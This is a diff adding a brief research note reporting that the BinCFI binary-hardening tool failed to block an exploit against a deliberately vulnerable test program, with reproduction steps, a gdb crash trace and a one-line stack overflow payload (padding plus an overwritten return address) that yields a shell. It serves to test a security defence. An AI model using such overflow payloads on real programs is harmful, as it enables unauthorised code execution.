@@ -1,0 +1,26 @@
+- We tried to experiment with BinCFI.
+But failed because an exploit works :(
+
+How to reproduce
+- compile vuln in test directory
+- copy it to given virtualbox (http://www.seclab.cs.sunysb.edu/seclab/psi/psi-vbox-v1.0.tar.gz)
+- /home/mingwei/cfi/modify_elf.py ./vuln
+- ./target_elf/vuln/vuln_final `python -c'print"A"*268 + "\xca\x84\x04\x08"'`
+GIVE ME INPUT
+$ echo 'PWNED!!'
+PWNED!!
+
+- Static compiled binary with CFI is crashed!
+
+(gdb) r
+Starting program: /home/mingwei/cfi/python_rw/target_elf/vuln/vuln_final 
+
+Program received signal SIGSEGV, Segmentation fault.
+0x03000000 in ?? ()
+(gdb) x/i $pc
+=> 0x3000000: Cannot access memory at address 0x3000000
+
+- I installed BinCFI in VM.
+In given cfi-1.1.tar.gz, it has no modify_ldt directory.
+Even though the folder doesn't exist, modifying elf seems work.
+However, the result was same. The exploit works.
